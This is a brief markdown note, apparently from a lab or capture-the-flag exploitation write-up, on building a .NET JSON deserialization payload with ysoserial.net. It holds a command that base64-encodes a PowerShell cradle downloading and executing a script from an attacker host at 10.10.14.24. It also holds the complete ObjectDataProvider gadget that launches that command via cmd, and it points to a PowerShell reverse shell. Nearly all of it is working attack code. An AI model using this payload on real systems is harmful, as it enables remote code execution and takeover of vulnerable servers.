 ## Payload generated with ysoserial.net (https://github.com/pwntester/ysoserial.net) on Windows machine

 To generate our encoded powershell command: 
 ```echo -n "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8000/exploit.ps')" | iconv -t UTF-16LE | base64 -w 0; echo```
 
 The final payload:
```
 {
     '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName': 'Start',
     'MethodParameters': {
         '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
         '$values': ['cmd',
                     '/c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANAA6ADgAMAAwADAALwBlAHgAcABsAG8AaQB0AC4AcABzACcAKQA=']
     },
     'ObjectInstance': {
         '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
 ```

Powershell reverse shell from here
```
https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5
```